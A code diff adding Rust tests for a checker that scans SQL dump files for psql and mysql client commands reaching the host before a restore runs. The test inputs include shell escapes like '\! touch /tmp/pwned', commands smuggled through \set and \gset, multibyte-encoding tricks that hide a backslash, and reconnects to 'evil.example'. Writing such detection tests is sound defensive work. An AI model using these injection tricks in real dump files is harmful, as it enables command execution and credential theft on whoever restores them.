+            "\\t `touch /tmp/x`\n",
+            "\\dt+ `touch /tmp/x`\n",
+            "\\if `touch /tmp/x`\n",
+            "\\echo hello `touch /tmp/x`\n",
+            "\\some_future_command `touch /tmp/x`\n",
+        ] {
+            let found = found(true, text.as_bytes());
+            assert!(
+                found
+                    .as_ref()
+                    .is_some_and(|(line, command)| *line == 1 && command.contains("shell command")),
+                "{text:?}: {found:?}"
+            );
+        }
+        // psql runs no backquote after a command without arguments, after
+        // an unknown one, or in COPY data.
+        for text in [
+            "\\r `touch /tmp/x`\n",
+            "\\N\t`a`\n",
+            "a\\tb `code`\n",
+            "line\\r\\nwith `code`\n",
+            "SELECT '`';\n",
+        ] {
+            assert_eq!(found(true, text.as_bytes()), None, "{text:?}");
+        }
+    }
+
+    #[test]
+    fn a_multibyte_character_cannot_hide_a_backslash() {
+        // In SJIS, 0x81 0x5c is one character: psql then reads `\!`.
+        assert_eq!(
+            found(true, b"\\encoding SJIS\nSELECT 1 \x81\x5c\x5c! touch m\n"),
+            Some((2, "\\!".into()))
+        );
+        // 0x81 0x81 is one character: the backslash after it is real.
+        assert_eq!(
+            found(true, b"\\encoding SJIS\nSELECT 1 \x81\x81\x5c! touch m\n"),
+            Some((2, "\\!".into()))
+        );
+        assert_eq!(
+            found(false, b"SET NAMES sjis;\nSELECT 1; \x81\x5c\x5c! touch m\n"),
+            Some((2, "\\!".into()))
+        );
+        // UTF-8 text before an escaped backslash in COPY data.
+        assert_eq!(
+            found(true, "caf\u{e9}\\\\x\tna\u{ef}ve\\\\n\n".as_bytes()),
+            None
+        );
+    }
+
+    #[test]
+    fn what_pg_dump_writes_is_not_flagged() {
+        let dump = "--\n-- PostgreSQL database dump\n--\n\n\\restrict Ab12cd\n\n\
+            SET standard_conforming_strings = on;\n\\encoding UTF8\n\
+            CREATE DOMAIN email AS text CHECK ((VALUE ~ '^[^@\\s]+@[^@\\s]+$'::text));\n\
+            CREATE FUNCTION f() RETURNS text LANGUAGE sql AS $$ SELECT '\\d+\\w*' $$;\n\
+            COPY public.notes (id, body) FROM stdin;\n\
+            1\tC:\\\\Users\\\\x\\\\out.txt\n\
+            2\ttab\\there\\nnew line\\r\\n\\\\! not a command \\\\o x\n\
+            3\t\\N\n\
+            4\t\\\\.\\\\set x\\\\\\\\\n\
+            5\t\\x41\\101\\b\\f\\v caf\u{e9}\n\
+            \\.\n\
+            SELECT pg_catalog.setval('public.notes_id_seq', 5, true);\n\n\
+            \\unrestrict Ab12cd\n";
+        assert_eq!(found(true, dump.as_bytes()), None);
+    }
+
+    #[test]
+    fn a_file_that_fakes_the_pg_dump_markers_is_still_refused() {
+        let text = "\\restrict x\nSELECT 1;\n\\unrestrict x\n\\! touch /tmp/pwned\n";
+        assert_eq!(found(true, text.as_bytes()), Some((4, "\\!".into())));
+        // Setting a variable that a later line runs.
+        let text = "\\restrict x\n\\set cmd '\\\\! touch /tmp/pwned'\nSELECT :cmd;\n";
+        assert_eq!(found(true, text.as_bytes()), Some((2, "\\set".into())));
+        let text = "SELECT chr(92) || '! touch /tmp/pwned' AS cmd \\gset\n:cmd\n";
+        assert_eq!(found(true, text.as_bytes()), Some((1, "\\gset".into())));
+    }
+
+    #[test]
+    fn mysql_commands_that_reach_the_computer_are_found_with_their_line() {
+        for (text, expected) in [
+            ("SELECT 1;\nsystem touch /tmp/x\n", (2, "system")),
+            ("SELECT 1;\n  SYSTEM touch /tmp/x\n", (2, "SYSTEM")),
+            ("SELECT 1;\n\tsource /tmp/x.sql\n", (2, "source")),
+            ("SELECT 1;\ntee /tmp/out\n", (2, "tee")),
+            ("SELECT 1;\npager;\n", (2, "pager")),
+            ("SELECT 1;\nedit\n", (2, "edit")),
+            ("SELECT 1;\nconnect db evil.example\n", (2, "connect")),
+            ("SELECT 1;\nsystem", (2, "system")),
+            ("SELECT 1;\n\\! touch /tmp/x\n", (2, "\\!")),
+            ("SELECT 1; \\! touch /tmp/x\n", (1, "\\!")),
+            ("SELECT 1 \\. /tmp/x.sql\n", (1, "\\.")),
+            ("/*!40101 \\T /tmp/out */;\n", (1, "\\T")),
+            ("SELECT 1;\n\\P cat\n", (2, "\\P")),
+            ("SELECT 1\\e\n", (1, "\\e")),
+            ("SELECT '\\\\\\! x';\n", (1, "\\!")),
+            // connect: to another host, with the password the client holds.
+            ("SELECT 1;\n\\r kerno evil.example\n", (2, "\\r")),
+            ("SELECT 1; \\r kerno evil.example\n", (1, "\\r")),
+            ("SELECT 1;\n\nconnect kerno evil.example\n", (3, "connect")),
+            ("SELECT 1;\nCONNECT kerno evil.example;\n", (2, "CONNECT")),
+            (
+                "SELECT 1;\nssl_session_data_print /tmp/x\n",
+                (2, "ssl_session_data_print"),
+            ),
+        ] {
+            assert_eq!(
+                found(false, text.as_bytes()),
+                Some((expected.0, expected.1.into())),
+                "{text:?}"
+            );
+        }
+        // A byte-order mark, and a Latin-1 letter mysql may take for a plain
+        // one.
+        assert_eq!(
+            found(false, b"\xef\xbb\xbfsystem touch x\n"),
+            Some((1, "system".into()))
+        );
+        assert!(found(false, b"syst\xe9m touch x\n").is_some());
+    }
+
+    #[test]
+    fn what_mysqldump_writes_is_not_flagged() {
+        let dump = "/*M!999999\\- enable the sandbox mode */ \n\
+            -- MySQL dump 10.13  Distrib 26.10.0, for macos27.0 (arm64)\n\
+            /*!40101 SET NAMES utf8mb4 */;\n\
+            INSERT INTO `notes` VALUES (1,'C:\\\\Users\\\\x \\\\! \\\\. \\\\T'),\
+            (2,'Multi-line\\ntext with \\\"quotes\\\", it\\'s \\n \\0 \\Z caf\u{e9}');\n\
+            INSERT INTO `blobs` VALUES (_binary '\u{de}\\\\x');\n\
+            DELIMITER ;;\n\
+            /*!50003 CREATE*/ /*!50003 TRIGGER `t` BEFORE INSERT ON `notes` FOR EACH ROW BEGIN\n\
+              SET NEW.body = CONCAT(NEW.body, '\\\\');\n\
+              system_count: LOOP LEAVE system_count; END LOOP;\n\
+            END */;;\n\
+            DELIMITER ;\n\
+            USE `kerno`;\n\
+            source_id INT,\n\
+            -- Dump completed\n";
+        assert_eq!(found(false, dump.as_bytes()), None);
+        // The known false alarm: a carriage return in a string is written
+        // `\r`, the short form of `connect`.
+        assert_eq!(
+            found(
+                false,
+                b"INSERT INTO t VALUES (1);\nINSERT INTO t VALUES (2,'a\\r\\nb');\n"
+            ),
+            Some((2, "\\r".into()))
+        );
+        // Bytes >= 0x80 before a backslash that mysqldump writes in binary
+        // strings.
+        assert_eq!(
+            found(
+                false,
+                b"INSERT INTO b VALUES (_binary '\xde\xad\xbe\\\xef\\0\xff');\n"
+            ),
+            None
+        );
+    }
+
+    #[tokio::test]
+    async fn a_refused_script_runs_nothing() {
+        let dir = tempfile::tempdir().unwrap();
+        let pwned = dir.path().join("pwned");
+        let started = dir.path().join("started");
+        let script = dir.path().join("dump.sql");
+        std::fs::write(
+            &script,
+            format!("SELECT 1;\n\\! touch {}\n", pwned.display()),
+        )
+        .unwrap();
+        // The "tool" would leave a mark if it started.
+        let mut command = shell(&format!("touch {}", started.display()));
+        command.script_check = Some((Tool::Psql, script.clone()));
+        let error = run(command, |_| {}, Arc::new(AtomicBool::new(false)))
+            .await
+            .unwrap_err();
+        let text = error.to_string();
+        assert!(matches!(error, Error::Config(_)), "{error:?}");
+        assert!(
+            text.contains("dump.sql, line 2: \\! is a psql client command"),
+            "{text}"
+        );
+        assert!(!started.exists() && !pwned.exists());
+
+        // A clean script: the tool starts.
+        std::fs::write(&script, "SELECT 1;\n").unwrap();
+        let mut command = shell(&format!("touch {}", started.display()));
+        command.script_check = Some((Tool::Mysql, script.clone()));
+        let status = run(command, |_| {}, Arc::new(AtomicBool::new(false)))
+            .await
+            .unwrap();
+        assert!(status.success() && started.exists());
+
+        let error = check_script(
+            Tool::Psql,
+            &dir.path().join("absent.sql"),
+            &AtomicBool::new(false),
+        )
+        .unwrap_err();
+        assert!(error.to_string().contains("absent.sql"), "{error}");
+        let cancelled = check_script(Tool::Psql, &script, &AtomicBool::new(true));
+        assert!(matches!(cancelled, Err(Error::Cancelled)), "{cancelled:?}");
+    }
+
+    /// A file written on the fly: each pattern repeated so many times.
+    /// Records the largest read the scan asks for.
+    struct Synthetic {
+        parts: [(&'static [u8], u64); 3],
+        part: usize,
+        offset: usize,
+        repeated: u64,
+        sent: u64,
+        largest_read: usize,
+    }
+
+    impl Read for Synthetic {
+        fn read(&mut self, buf: &mut [u8]) -> std::io::Result<usize> {
+            self.largest_read = self.largest_read.max(buf.len());
+            let mut written = 0;
+            while written < buf.len() && self.part < self.parts.len() {
+                let (pattern, times) = self.parts[self.part];
+                if self.repeated == times {
+                    (self.part, self.repeated) = (self.part + 1, 0);
+                    continue;
+                }
+                let n = (pattern.len() - self.offset).min(buf.len() - written);
+                buf[written..written + n].copy_from_slice(&pattern[self.offset..self.offset + n]);
+                (written, self.offset) = (written + n, self.offset + n);
+                if self.offset == pattern.len() {
+                    (self.offset, self.repeated) = (0, self.repeated + 1);
+                }
+            }
+            self.sent += written as u64;
+            Ok(written)
+        }
+    }
+
+    #[test]
+    fn a_200_mb_script_is_scanned_in_constant_memory() {
+        // COPY data: 100 MB on one line, then 100 MB of short lines, then a
+        // command on the last line.
+        const LONG: &[u8] = b"C:\\\\Users\\\\x\\tcaf\xc3\xa9 \\N\t`code`\\\\! ";
+        const SHORT: &[u8] = b"42\tC:\\\\tmp\\\\a\\nb\t\\N\n";
+        const TAIL: &[u8] = b"\\! touch /tmp/never\n";
+        const HALF: u64 = 100 * 1024 * 1024;
+        let (long, short) = (HALF / LONG.len() as u64, HALF / SHORT.len() as u64);
+        let mut source = Synthetic {
+            parts: [(LONG, long), (SHORT, short), (TAIL, 1)],
+            part: 0,
+            offset: 0,
+            repeated: 0,
+            sent: 0,
+            largest_read: 0,
+        };
+        let started = Instant::now();
+        let found = scan(
+            true,
+            &mut source,
+            Path::new("big.sql"),
+            &AtomicBool::new(false),
+        )
+        .unwrap()
+        .unwrap();
+        eprintln!("scanned {} bytes in {:?}", source.sent, started.elapsed());
+        assert!(source.sent > 2 * HALF - 1024, "{}", source.sent);
+        assert_eq!(
+            found,
+            Finding {
+                line: 1 + short,
+                command: "\\!".into()
+            }
+        );
+        // All the scan holds of the file: one read buffer, whatever the
+        // length of a line, and a scanner of fixed size (no heap).
+        assert_eq!(source.largest_read, SCAN_CHUNK);
+        assert!(std::mem::size_of::<Scanner>() < 256);
     }
 
     #[test]
@@ -960,6 +2020,7 @@ mod tests {
             password: Some(("PGPASSWORD", Secret::new(PASSWORD))),
             stdin: None,
             tunnel: None,
+            script_check: None,
         }
     }
 
